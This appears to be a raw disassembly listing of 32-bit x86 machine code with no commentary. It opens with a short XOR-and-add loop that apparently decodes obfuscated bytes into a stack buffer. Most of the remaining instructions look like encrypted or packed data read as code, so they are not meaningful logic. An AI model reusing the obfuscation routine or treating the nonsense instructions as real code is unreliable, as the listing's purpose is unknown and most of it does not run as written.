  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xb,al
  41049c:	not    edx
  41049e:	fdiv   QWORD PTR [bx+si+0x7e7e]
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x410465
  4104a8:	add    DWORD PTR [edi+0x1f3dcdd0],ebx
  4104ae:	xchg   ebp,eax
  4104af:	inc    esp
  4104b0:	xor    esp,DWORD PTR [eax]
  4104b2:	mov    cs,WORD PTR [edx]
  4104b4:	ins    DWORD PTR es:[edi],dx
  4104b5:	jp     0x410527
  4104b7:	and    DWORD PTR [ebp+ebp*2-0xd],edi
  4104bb:	push   esp
  4104bc:	sub    DWORD PTR [esi+0x79],ecx
  4104bf:	xchg   ebp,eax
  4104c0:	rcl    ecx,0xf7
  4104c3:	mov    bh,0xa5
  4104c5:	mov    bh,0x40
  4104c7:	repnz xor BYTE PTR [ebx-0x17],0x72
  4104cc:	dec    eax
  4104cd:	dec    esp
  4104ce:	jp     0x41048f
  4104d0:	test   DWORD PTR [eax+0x4a7e3e5b],0xedfe0bb
  4104da:	dec    ebx
  4104db:	jns    0x410517
  4104dd:	inc    ecx
  4104de:	ror    DWORD PTR [ebx-0x27],cl
  4104e1:	ja     0x4104f0
  4104e3:	jb     0x410559
  4104e5:	(bad)  
  4104e6:	js     0x4104af
  4104e8:	jge    0x41053a
  4104ea:	jno    0x410533
  4104ec:	and    eax,0xcd48919b
  4104f1:	and    BYTE PTR [esi-0x29475471],0x78
  4104f8:	mov    esp,DWORD PTR [ecx*8+0x6ba8b0f4]
  4104ff:	out    dx,eax
  410500:	pop    edi
  410501:	cli    
  410502:	adc    al,BYTE PTR [ecx+edx*8-0x34]
  410506:	scas   eax,DWORD PTR es:[edi]
  410507:	shr    BYTE PTR [ecx+0x7626df40],0xa8
  41050e:	ins    DWORD PTR es:[edi],dx
  41050f:	add    ch,BYTE PTR [ebx+edi*1+0x49]
  410513:	dec    eax
  410514:	or     bh,dl
  410516:	scas   al,BYTE PTR es:[edi]
  410517:	xchg   esi,eax
  410518:	sbb    eax,0xf0e9444f
  41051d:	sbb    al,0x74
  41051f:	xchg   BYTE PTR [ebx+0x1d8ec082],al
  410525:	push   ecx
  410526:	rcl    BYTE PTR [ebp+0x18],0xe2
  41052a:	jb     0x410515
  41052c:	js     0x410595
  41052e:	out    dx,al
  41052f:	aad    0x6f
  410531:	push   ss
  410532:	pop    esp
  410533:	push   0x894cf1ba
  410538:	mov    ah,0x98
  41053a:	xchg   ecx,eax
  41053b:	stos   DWORD PTR es:[edi],eax
  41053c:	aam    0xa4
  41053e:	hlt    
  41053f:	rol    DWORD PTR [ebp+0x69f7b686],0xc4
  410546:	xchg   DWORD PTR [edx+0x7a],esi
  410549:	and    BYTE PTR [ebp+0x42],0xc4
  41054d:	enter  0x834e,0x77
  410551:	inc    ecx
  410552:	lods   al,BYTE PTR ds:[esi]
  410553:	inc    ecx
  410554:	call   0x9fb90edd
  410559:	popf   
  41055a:	sbb    ecx,DWORD PTR [edi-0x29]
  41055d:	and    DWORD PTR [ebx],0x9b088c35
  410563:	or     eax,0xbad8f921
  410568:	rcl    DWORD PTR [ecx],0x59
  41056b:	pop    ds
  41056c:	inc    edi
  41056d:	pop    esi
  41056e:	repnz retf 
  410570:	xchg   edx,eax
  410571:	dec    edi
  410572:	repnz fldenv [esi*1+0x69f067ea]
  41057a:	sbb    edx,DWORD PTR [esi]
  41057c:	mov    cl,0xbd
  41057e:	lock shr DWORD PTR [eax],cl
  410581:	mov    WORD PTR [esi],?
  410583:	test   DWORD PTR [edi+0x10],edi
  410586:	xor    BYTE PTR [esi-0x73],bl
  410589:	lock test cl,ch
  41058c:	jb     0x4105bb
  41058e:	adc    ebp,DWORD PTR [edx+0x51a4e0fb]
  410594:	sbb    bh,BYTE PTR [edx]
  410596:	cmp    BYTE PTR [ecx-0x4e],dl
  410599:	adc    edx,edi
  41059b:	cmp    BYTE PTR [eax+0x19],dh
  41059e:	outs   dx,BYTE PTR ds:[esi]
  41059f:	xor    ah,BYTE PTR [edx-0x58]
  4105a2:	ds or  eax,ebx
  4105a5:	scas   al,BYTE PTR es:[edi]
  4105a6:	sub    DWORD PTR [ecx-0x66d5206d],eax
  4105ac:	dec    eax
  4105ad:	mov    al,bh
  4105af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105b0:	ss mov ch,0xd1
  4105b3:	mov    BYTE PTR [esi+0x59],ch
  4105b6:	cmp    DWORD PTR [esi+edx*8+0x48],esi
  4105ba:	fucomp st(6)
  4105bc:	js     0x4105d3
  4105be:	mov    edi,0x520048a6
  4105c3:	adc    BYTE PTR fs:[eax+0x24],ah
  4105c7:	adc    BYTE PTR [ebx*1+0x388c5aa1],bh
  4105ce:	and    al,0xf2
  4105d0:	lods   al,BYTE PTR ds:[esi]
  4105d1:	mov    edi,0x3a1a7a2c
  4105d6:	in     al,0x9c
  4105d8:	lods   al,BYTE PTR ds:[esi]
  4105d9:	ret    0x59cd
  4105dc:	adc    al,0x41
  4105de:	add    BYTE PTR [ebp-0x7a6c2a6f],0x7e
  4105e5:	sub    dh,BYTE PTR [edx-0x8333706]
  4105eb:	out    0x8e,eax
  4105ed:	sub    BYTE PTR ds:0xdf5a3b40,dh
  4105f3:	jmp    0x1b0b:0xb3a5cde2
  4105fa:	push   es
  4105fb:	test   al,0x16
  4105fd:	mov    esp,DWORD PTR [esi-0x2fa2e8a9]
  410603:	shl    ecx,cl
  410605:	xchg   edi,eax
  410606:	dec    eax
  410607:	fstp   TBYTE PTR [eax-0x481ffe50]
  41060d:	je     0x410623
  41060f:	stos   DWORD PTR es:[edi],eax
  410610:	and    esi,ebx
  410612:	fisttp WORD PTR [ebp+0x40]
  410615:	sbb    eax,0x11b826d3
  41061a:	pushf  
  41061b:	add    DWORD PTR ds:0x2dbb1ac4,ecx
  410621:	out    0xe6,eax
  410623:	jb     0x4105a8
  410625:	sub    eax,0x54bf2aa
  41062a:	sbb    edx,esp
  41062c:	sbb    bl,BYTE PTR ds:0x1c729b7c
  410632:	cmc    
  410633:	sysenter 
  410635:	cmp    eax,0x711fb548
  41063a:	shl    BYTE PTR [edi+0x5eee0395],cl
  410640:	das    
  410641:	jecxz  0x4105fb
  410643:	mov    al,ds:0x3f29dc35
  410648:	add    ecx,DWORD PTR [esi]
  41064a:	fistp  QWORD PTR [ecx+0x3b74ee73]
  410650:	mov    ecx,0xfaf904b8
  410655:	out    dx,eax
  410656:	xor    BYTE PTR [edi-0x42],dh
  410659:	xchg   esp,eax
  41065a:	push   ecx
  41065b:	adc    al,0xf
  41065d:	aaa    
  41065e:	outs   dx,BYTE PTR ds:[esi]
  41065f:	sbb    al,0xf6
  410661:	xchg   esi,eax
  410662:	inc    edi
  410663:	popa   
  410664:	aaa    
  410665:	mov    eax,0xd709524f
  41066a:	mov    dh,0x3d
  41066c:	or     BYTE PTR [esi],0x8e
  41066f:	jl     0x4106aa
  410671:	retf   0xf8b8
  410674:	mov    ds:0x5479a079,eax
  410679:	stos   BYTE PTR es:[edi],al
  41067a:	popa   
  41067b:	inc    esp
  41067c:	inc    edi
  41067d:	bound  ebx,QWORD PTR [edi-0x6]
  410680:	shr    BYTE PTR [ebx+0x502b0abf],1
  410686:	sahf   
  410687:	cwde   
  410688:	push   ecx
  410689:	je     0x4106a8
  41068b:	mov    DWORD PTR [edi],ebp
  41068d:	xchg   esp,eax
  41068e:	dec    ecx
  41068f:	test   BYTE PTR [edx-0x14b0ac2c],0x1e
  410696:	sbb    cl,dl
  410698:	sub    cl,dl
  41069a:	icebp  
  41069b:	cmp    ax,0x9cd8
  41069f:	test   BYTE PTR [ecx+0x45c40107],0xaf
  4106a6:	dec    ebx
  4106a7:	sbb    DWORD PTR [ecx-0x2e],ebx
  4106aa:	out    0xae,eax
  4106ac:	sbb    al,0x62
  4106ae:	push   ds
  4106af:	loope  0x4106da
  4106b1:	lahf   
  4106b2:	hlt    
  4106b3:	in     eax,0x60
  4106b5:	std    
  4106b6:	cs sub ah,BYTE PTR fs:[ecx+edi*1+0x7f28eb25]
  4106bf:	cs adc al,0x50
  4106c2:	pop    esi
  4106c3:	cmp    DWORD PTR [edx],eax
  4106c5:	and    bl,BYTE PTR [esi-0x4f554084]
  4106cb:	outs   dx,BYTE PTR ds:[esi]
  4106cc:	nop
  4106cd:	xor    bl,BYTE PTR [edi+0x946dd91]
  4106d3:	out    dx,al
  4106d4:	(bad)  
  4106d5:	loopne 0x410711
  4106d7:	and    al,0x8
  4106d9:	neg    DWORD PTR [edi]
  4106db:	sbb    dl,BYTE PTR [esi]
  4106dd:	push   ss
  4106de:	xor    BYTE PTR [eax],ah
  4106e0:	jo     0x4106bc
  4106e2:	test   esi,esi
  4106e4:	pop    ecx
  4106e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e6:	dec    ebp
  4106e7:	sub    DWORD PTR [esi+0xa],eax
  4106ea:	int3   
  4106eb:	or     BYTE PTR [edx+0x60],cl
  4106ee:	hlt    
  4106ef:	jg     0x410763
  4106f1:	int3   
  4106f2:	fdiv   DWORD PTR ds:0x2fff4740
  4106f8:	out    dx,eax
  4106f9:	test   ch,dl
  4106fb:	out    dx,al
  4106fc:	sbb    eax,ecx
  4106fe:	arpl   WORD PTR [ebp-0x2d],bx
  410701:	sbb    BYTE PTR [eax+0x70],ch
  410704:	dec    edx
  410705:	xchg   edx,eax
  410706:	into   
  410707:	push   esp
  410708:	mov    ch,0xe5
  41070a:	xor    BYTE PTR [esi],0x84
  41070d:	test   esp,esp
  41070f:	cmp    al,0x10
  410711:	xchg   ebx,eax
  410712:	mov    ebx,cs
  410714:	aaa    
  410715:	push   esi
  410716:	sub    eax,0x1b316605
  41071b:	xchg   edi,eax
  41071c:	push   ds
  41071d:	pop    esp
  41071e:	inc    edi
  41071f:	popa   
  410720:	adc    edi,DWORD PTR [ecx]
  410722:	test   al,0x7
  410724:	lods   al,BYTE PTR ds:[esi]
  410725:	ss jl  0x410722
  410728:	sbb    ah,BYTE PTR [eax+eax*8+0x5a]
  41072c:	ds mov bh,bl
  41072f:	adc    edi,esi
  410731:	js     0x4107a1
  410733:	or     al,0xb4
  410735:	sub    DWORD PTR [ebp-0x4d014cce],esi
  41073b:	jg     0x41078f
  41073d:	sub    esp,esp
  41073f:	shr    BYTE PTR [edi+0x4115020],cl
  410745:	sub    eax,0x4035934e
  41074a:	lds    eax,FWORD PTR [ebx-0x30]
  41074d:	inc    ebp
  41074e:	or     bh,ch
  410750:	aam    0xb3
  410752:	lods   al,BYTE PTR ds:[esi]
  410753:	cmp    ch,BYTE PTR [ecx-0x744cc1e4]
  410759:	inc    ebp
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xa1aa4b4b
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x41078f
  41078c:	sbb    BYTE PTR [edi-0x2],bh
  41078f:	add    al,0x50
  410791:	jmp    0x410810
  410793:	mov    cl,0x67
  410795:	out    dx,eax
  410796:	repnz inc edx
  410798:	test   eax,0x1b732f68
  41079d:	cmp    ecx,DWORD PTR [edi]
  41079f:	or     DWORD PTR [esp+edi*1+0x30a8a017],ebx
  4107a6:	and    DWORD PTR [eax-0x6bc535a],esi
  4107ac:	sbb    eax,DWORD PTR [ebx-0x7b]
  4107af:	aas    
  4107b0:	adc    al,dh
  4107b2:	jae    0x4107e4
  4107b4:	sub    DWORD PTR ds:0xf3cac82a,edi
  4107ba:	xor    al,0xd4
  4107bc:	mov    eax,0xf4bcb13f
  4107c1:	and    eax,0xc6dc65c5
  4107c6:	jo     0x410813
  4107c8:	retf   
  4107c9:	xchg   ebx,eax
  4107ca:	cmp    al,BYTE PTR [edi+eax*2+0x1d]
  4107ce:	xchg   esp,eax
  4107cf:	test   eax,0x554d6ed4
  4107d4:	xor    ah,BYTE PTR [eax-0x1fea9491]
  4107da:	sbb    ch,dh
  4107dc:	adc    eax,0x3c8a83b8
  4107e1:	and    al,0x1d
  4107e3:	or     edi,ebx
  4107e5:	xor    ebp,DWORD PTR [eax+0x40b81ce1]
  4107eb:	in     al,dx
  4107ec:	in     eax,0x24
  4107ee:	aam    0x56
  4107f0:	loop   0x4107a2
  4107f2:	jg     0x4107ab
  4107f4:	xchg   DWORD PTR [edi],edi
  4107f6:	outs   dx,BYTE PTR ds:[esi]
  4107f7:	scas   al,BYTE PTR es:[edi]
  4107f8:	xor    eax,ebx
  4107fa:	fsub   st,st(0)
  4107fc:	in     eax,dx
  4107fd:	repnz xlat BYTE PTR ds:[ebx]
  4107ff:	adc    DWORD PTR [eax-0x5398862d],ebx
  410805:	push   ecx
  410806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410807:	shl    BYTE PTR [ebp-0x1f],cl
  41080a:	mul    BYTE PTR [ebx-0x1f]
  41080d:	cli    
  41080e:	push   es
  41080f:	mov    esi,0xeb1ed853
  410814:	add    eax,0x382192b4
  410819:	lahf   
  41081a:	push   ecx
  41081b:	aaa    
  41081c:	xor    BYTE PTR [ecx],ch
  41081e:	ja     0x4107c5
  410820:	sub    ebx,DWORD PTR [esi-0x48b70c28]
  410826:	mov    edi,0x7cec65b6
  41082b:	add    eax,0x187fcdfa
  410830:	cs sbb eax,0xd8e9a12d
  410836:	test   esi,esp
  410838:	and    eax,0xe5fc8391
  41083d:	out    dx,eax
  41083e:	push   DWORD PTR [esi-0x29]
  410841:	mov    esp,0xc888a175
  410846:	pop    esi
  410847:	out    dx,al
  410848:	jne    0x410871
  41084a:	nop
  41084b:	jae    0x4107df
  41084d:	icebp  
  41084e:	inc    ecx
  41084f:	les    ecx,FWORD PTR [edi]
  410851:	xchg   esp,eax
  410852:	int3   
  410853:	cli    
  410854:	aam    0xa5
  410856:	inc    edi
  410857:	test   edi,ebx
  410859:	and    edx,DWORD PTR [edx-0x18282dfc]
  41085f:	int3   
  410860:	in     al,0x18
  410862:	enter  0xba74,0x8f
  410866:	lods   al,BYTE PTR ds:[esi]
  410867:	sar    DWORD PTR [esi+0x7452b068],cl
  41086d:	xor    DWORD PTR [ecx-0x13ca1ec1],edi
  410873:	jg     0x41085d
  410875:	in     eax,0x76
  410877:	shl    DWORD PTR [ebx+esi*4+0xd],cl
  41087b:	aas    
  41087c:	fisttp WORD PTR [ebx]
  41087e:	lahf   
  41087f:	push   es
  410880:	test   DWORD PTR [ebp-0x7c],ecx
  410883:	add    dh,BYTE PTR [esi-0x45aba6a8]
  410889:	push   eax
  41088a:	push   0xcd1ceb1d
  41088f:	pushf  
  410890:	daa    
  410891:	mov    esp,0x6f7b1de6
  410896:	test   BYTE PTR [ecx+0x21],bl
  410899:	jmp    0x410882
  41089b:	imul   ebp,DWORD PTR [esi+ebp*4-0x62aeebf7],0x65
  4108a3:	js     0x410905
  4108a5:	iret   
  4108a6:	inc    ecx
  4108a7:	push   edi
  4108a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108a9:	(bad)  
  4108aa:	sbb    al,0x6d
  4108ac:	cmp    al,BYTE PTR cs:[ecx-0x7f9f8c44]
  4108b3:	sbb    DWORD PTR [ebx],ebp
  4108b5:	dec    ebp
  4108b6:	jmp    0x8f7cf6ab
  4108bb:	dec    edx
  4108bc:	mov    al,ds:0xb14ab757
  4108c1:	xor    al,0x6a
  4108c3:	cmc    
  4108c4:	mov    ebx,0x8c7aa798
  4108c9:	lea    esp,[eax]
  4108cb:	xchg   esp,eax
  4108cc:	retf   0xba9d
  4108cf:	loope  0x4108a1
  4108d1:	(bad)  
  4108d2:	adc    eax,0x5ed6ca83
  4108d7:	nop
  4108d8:	or     BYTE PTR [ebx+0x19],dl
  4108db:	or     DWORD PTR [eax-0x71],ebp
  4108de:	mov    ebx,0xdf12fca5
  4108e3:	cmp    al,0xec
  4108e5:	cdq    
  4108e6:	xlat   BYTE PTR ds:[ebx]
  4108e7:	imul   eax,edi,0x67
  4108ea:	and    DWORD PTR [edx],eax
  4108ec:	and    al,0x7c
  4108ee:	loop   0x4108b6
  4108f0:	xor    al,BYTE PTR [esi]
  4108f2:	xchg   edi,eax
  4108f3:	inc    edx
  4108f4:	xchg   BYTE PTR [eax-0x6d2a5afb],ah
  4108fa:	mov    edi,0x54b3c547
  4108ff:	xor    dl,ah
  410901:	xor    BYTE PTR [ebp-0x6],dh
  410904:	push   ecx
  410905:	outs   dx,BYTE PTR ds:[esi]
  410906:	in     al,dx
  410907:	ins    DWORD PTR es:[edi],dx
  410908:	mov    edi,esp
  41090a:	pop    ebp
  41090b:	mov    ebx,0x859429f9
  410910:	cmc    
  410911:	imul   BYTE PTR [ebx+ebx*2+0x44]
  410915:	push   ebp
  410916:	les    edx,FWORD PTR ss:[esi-0x695770cf]
  41091d:	call   DWORD PTR [edi-0x4d]
  410920:	cmp    ebp,ebp
  410922:	and    al,0x0
  410924:	add    ecx,eax
  410926:	bound  esp,QWORD PTR [edi-0x436a9f35]
  41092c:	mov    ebp,0x83cc02b0
  410931:	ror    esp,0x64
  410934:	dec    ebp
  410935:	ins    BYTE PTR es:[edi],dx
  410936:	aas    
  410937:	jnp    0x41093b
  410939:	stos   DWORD PTR es:[edi],eax
  41093a:	and    DWORD PTR [esi-0x34],edi
  41093d:	loope  0x410904
  41093f:	pusha  
  410940:	cmp    bh,ch
  410942:	aam    0x4b
  410944:	jecxz  0x410987
  410946:	push   esi
  410947:	loope  0x410967
  410949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41094a:	adc    ebp,ebx
  41094c:	cdq    
  41094d:	loope  0x410990
  41094f:	aad    0xe3
  410951:	add    edx,DWORD PTR [ebx-0x30]
  410954:	sub    ebx,edi
  410956:	pop    ebp
  410957:	jnp    0x41098c
  410959:	jecxz  0x41090e
  41095b:	fadd   DWORD PTR [edx-0x71fc5de0]
  410961:	pushf  
  410962:	leave  
  410963:	sub    edx,DWORD PTR [ebx-0x4a]
  410966:	clc    
  410967:	rcl    dl,1
  410969:	xchg   edi,eax
  41096a:	mov    al,0xfb
  41096c:	xchg   ebx,eax
  41096d:	and    eax,0x24c3e46d
  410972:	(bad)  
  410973:	cmp    al,0x45
  410975:	xor    BYTE PTR [ebx-0x4146de2f],cl
  41097b:	or     eax,0x4083ba18
  410980:	(bad)  
  410981:	in     al,dx
  410982:	xchg   ebp,eax
  410983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410984:	ret    0x133e
  410987:	sub    BYTE PTR [ebx-0xd34fe7c],bl
  41098d:	shl    BYTE PTR [edx-0x5a3cea5e],cl
  410993:	add    ecx,DWORD PTR [edi]
  410995:	adc    al,0x49
  410997:	scas   eax,DWORD PTR es:[edi]
  410998:	mov    ch,dl
  41099a:	ret    0xf24c
  41099d:	sub    DWORD PTR [edi-0x5c24a057],0x973da8e6
  4109a7:	inc    ecx
  4109a8:	stos   DWORD PTR es:[edi],eax
  4109a9:	jne    0x4109cf
  4109ab:	mov    esi,0xc887c908
  4109b0:	pop    esp
  4109b1:	pop    esi
  4109b2:	adc    al,0x8a
  4109b4:	push   ecx
  4109b5:	xor    BYTE PTR [ecx-0xfe47064],bl
  4109bb:	imul   esi,esp,0xce58cd39
  4109c1:	push   es
  4109c2:	jo     0x4109d7
  4109c4:	fld    DWORD PTR [eax]
  4109c6:	out    0x22,eax
  4109c8:	and    eax,0x870c0d28
  4109cd:	push   ebp
  4109ce:	fnstenv [ecx]
  4109d0:	lods   al,BYTE PTR ds:[esi]
  4109d1:	adc    BYTE PTR ds:0xbd7c8150,dh
  4109d7:	mov    edx,esp
  4109d9:	out    0xef,eax
  4109db:	inc    ebx
  4109dc:	loopne 0x4109a5
  4109de:	pop    ecx
  4109df:	stos   BYTE PTR es:[edi],al
  4109e0:	ret    
  4109e1:	jbe    0x410a04
  4109e3:	push   esp
  4109e4:	and    al,dl
  4109e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e7:	mov    esp,0x61ac2ed9
  4109ec:	mov    dh,0xcc
  4109ee:	gs push edi
  4109f0:	cli    
  4109f1:	enter  0x4ba9,0x7c
  4109f5:	cwde   
  4109f6:	std    
  4109f7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109f9:	mov    cs,WORD PTR [eax-0x7a]
  4109fc:	lea    edx,[ebp+0x5f]
  4109ff:	push   ebx
  410a00:	pop    ebp
  410a01:	pop    ebx
  410a02:	retf   0x5101
  410a05:	dec    ebx
  410a06:	mov    bh,0x69
  410a08:	pop    DWORD PTR [ecx+0x38]
  410a0b:	cmp    cl,BYTE PTR [ebp+0x7b]
  410a0e:	ins    BYTE PTR es:[edi],dx
  410a0f:	cmp    edi,esi
  410a11:	sbb    al,0x3a
  410a13:	sbb    DWORD PTR [eax+eiz*4],ecx
  410a16:	call   0xb869c96
  410a1b:	adc    eax,0x89cdd5ae
  410a20:	pop    ebx
  410a21:	pop    edx
  410a22:	out    dx,eax
  410a23:	clc    
  410a24:	enter  0xc748,0x40
  410a28:	inc    ebx
  410a29:	xchg   ah,dh
  410a2b:	jae    0x410a79
  410a2d:	cmp    edx,esi
  410a2f:	jnp    0x410aa5
  410a31:	add    eax,0xf3d9809f
  410a36:	retf   
  410a37:	mov    WORD PTR [edx+esi*1],fs
  410a3a:	retf   0x3ec
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	fisttp WORD PTR [esi-0x48]
  410a52:	inc    esp
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a06
  410a5c:	dec    edi
  410a5d:	push   eax
  410a5e:	rcl    DWORD PTR [edi],1
  410a60:	out    dx,eax
  410a61:	fidivr WORD PTR [eax+0x35c2f9a1]
  410a67:	xor    eax,0x3c3337a9
  410a6c:	retf   
  410a6d:	jge    0x410aab
  410a6f:	ror    ebp,1
  410a71:	xchg   edx,eax
  410a72:	inc    esp
  410a73:	pop    ecx
  410a74:	pop    ebp
  410a75:	shl    BYTE PTR [ebx+0x554139a8],1
  410a7b:	jl     0x410a2c
  410a7d:	and    BYTE PTR [ecx-0x4a],al
  410a80:	cmp    cl,BYTE PTR [ebp+0x6ba4a8e4]
  410a86:	jecxz  0x410a47
  410a88:	cs jmp 0xf79a7f37
  410a8e:	dec    edi
  410a8f:	fst    DWORD PTR [ebp+0xe44155]
  410a95:	popf   
  410a96:	mov    dh,0x79
  410a98:	les    ebp,FWORD PTR [eax]
  410a9a:	test   al,0x30
  410a9c:	inc    eax
  410a9d:	jno    0x410ad6
  410a9f:	nop
  410aa0:	push   esp
  410aa1:	das    
  410aa2:	(bad)  
  410aa3:	popf   
  410aa4:	daa    
  410aa5:	add    DWORD PTR ds:0x99764d93,edi
  410aab:	inc    ebp
  410aac:	clc    
  410aad:	cmp    dh,dh
  410aaf:	jmp    0xbeffd6e2
  410ab4:	mov    ?,edi
  410ab6:	mov    BYTE PTR [esi-0x270a9121],bl
  410abc:	jo     0x410ac7
  410abe:	mov    dl,0x5f
  410ac0:	repz and bh,cl
  410ac3:	jle    0x410ac5
  410ac5:	xor    bh,BYTE PTR [edi-0x69]
  410ac8:	sahf   
  410ac9:	dec    edi
  410aca:	hlt    
  410acb:	out    0x61,eax
  410acd:	cdq    
  410ace:	call   0x11f8:0x3290f4c3
  410ad5:	stos   BYTE PTR es:[edi],al
  410ad6:	push   ds
  410ad7:	fst    st(3)
  410ad9:	xchg   esi,eax
  410ada:	leave  
  410adb:	sub    eax,0xc45298d8
  410ae0:	jno    0x410ac9
  410ae2:	mov    esp,0x5dcba810
  410ae7:	inc    eax
  410ae8:	stos   DWORD PTR es:[edi],eax
  410ae9:	jecxz  0x410ad5
  410aeb:	rcl    edi,0x5f
  410aee:	push   ebx
  410aef:	ror    ebx,cl
  410af1:	add    al,0xe9
  410af3:	mov    ecx,0x2105ec15
  410af8:	mov    ecx,0x1f2e296
  410afd:	jg     0x410b68
  410aff:	cwde   
  410b00:	mov    esi,0xa5f8bb23
  410b05:	pushf  
  410b06:	jmp    0x410b73
  410b08:	cmp    eax,0x8360999
  410b0d:	jle    0x410b7f
  410b0f:	jo     0x410aab
  410b11:	and    BYTE PTR [ebx],cl
  410b13:	test   DWORD PTR [esi],edi
  410b15:	adc    al,0xd
  410b17:	mov    cs,WORD PTR [ebx]
  410b19:	retf   
  410b1a:	(bad)
  410b1e:	mov    dh,0x1c
  410b20:	dec    ebp
  410b21:	dec    ecx
  410b22:	pop    ebx
  410b23:	stc    
  410b24:	lahf   
  410b25:	push   ebx
  410b26:	push   0x8789124f
  410b2b:	or     DWORD PTR [ecx],0x77
  410b2e:	jle    0x410b06
  410b30:	xchg   esi,eax
  410b31:	xchg   edi,eax
  410b32:	loop   0x410b4b
  410b34:	jo     0x410b76
  410b36:	and    eax,0x38aa108c
  410b3b:	out    0xd3,al
  410b3d:	in     al,dx
  410b3e:	adc    al,0xc3
  410b40:	xchg   edx,eax
  410b41:	cli    
  410b42:	pop    es
  410b43:	cwde   
  410b44:	int    0x98
  410b46:	fnsave [ebx+0x68]
  410b49:	mov    edx,0xf9ddab10
  410b4e:	retf   
  410b4f:	inc    esp
  410b50:	js     0x410b8a
  410b52:	mov    ebp,0x14b69cb7
  410b57:	lahf   
  410b58:	icebp  
  410b59:	in     eax,dx
  410b5a:	call   DWORD PTR [ebp+0x22]
  410b5d:	mov    edx,0xc994a7a4
  410b62:	or     al,0x8d
  410b64:	xor    eax,0x345bc0a4
  410b69:	dec    ebx
  410b6a:	addr16 test eax,0x7f580156
  410b70:	xlat   BYTE PTR ds:[ebx]
  410b71:	mov    edx,0x208d0184
  410b76:	loopne 0x410b33
  410b78:	jnp    0x410bcc
  410b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b7b:	jae    0x410b39
  410b7d:	cmc    
  410b7e:	xor    BYTE PTR [eax],dh
  410b80:	jnp    0x410b59
  410b82:	cli    
  410b83:	cmp    cl,BYTE PTR ds:0x74368269
  410b89:	sub    BYTE PTR [eax+0x3c3fea6e],dl
  410b8f:	or     al,0x82
  410b91:	add    edi,ecx
  410b93:	scas   al,BYTE PTR es:[edi]
  410b94:	sub    eax,0x5bbb4f64
  410b99:	repz test edx,eax
  410b9c:	push   esi
  410b9d:	bound  eax,QWORD PTR [eax+0x6d]
  410ba0:	mov    dl,0x6e
  410ba2:	sub    eax,0xfa677e4
  410ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba8:	pop    ds
  410ba9:	ins    BYTE PTR es:[edi],dx
  410baa:	mov    ah,bl
  410bac:	inc    ebp
  410bad:	xor    dl,cl
  410baf:	rol    DWORD PTR [esi],0x73
  410bb2:	ds sub al,0x95
  410bb5:	adc    ecx,0xffffffa5
  410bb8:	(bad)
  410bbc:	inc    ebp
  410bbd:	call   0xf39b:0x5f36353e
  410bc4:	pop    es
  410bc5:	jge    0x410c21
  410bc7:	jb     0x410b6f
  410bc9:	sbb    eax,0x9c255f84
  410bce:	and    ch,BYTE PTR [edi-0x1a]
  410bd1:	cmp    DWORD PTR [edi+ecx*2-0x51],ecx
  410bd5:	inc    ebp
  410bd6:	sar    BYTE PTR [ecx+0x5305d85b],0xb
  410bdd:	nop
  410bde:	pop    ds
  410bdf:	sbb    DWORD PTR [eax],ecx
  410be1:	mov    dl,0x23
  410be3:	mov    bl,0x52
  410be5:	das    
  410be6:	push   esp
  410be7:	ss jbe 0x410bdf
  410bea:	sub    al,0x8c
  410bec:	cwde   
  410bed:	sar    DWORD PTR [esi-0x3a8c2c4e],cl
  410bf3:	call   0xf5e2f1df
  410bf8:	add    DWORD PTR [ecx+0x7a],0xffffffbb
  410bfc:	sbb    al,0x80
  410bfe:	imul   edx,ecx,0xffffff8a
  410c01:	dec    eax
  410c02:	adc    eax,DWORD PTR [ebp+ebx*8+0x0]
  410c06:	dec    eax
  410c07:	jb     0x410bb1
  410c09:	imul   esp,DWORD PTR [ecx+edi*8-0x3a],0xba1ffa5e
  410c11:	mov    ds:0xaaf55418,eax
  410c16:	loopne 0x410c52
  410c18:	dec    esi
  410c19:	leave  
  410c1a:	sub    DWORD PTR [ebx-0x1fdffbe9],edi
  410c20:	in     al,0xab
  410c22:	hlt    
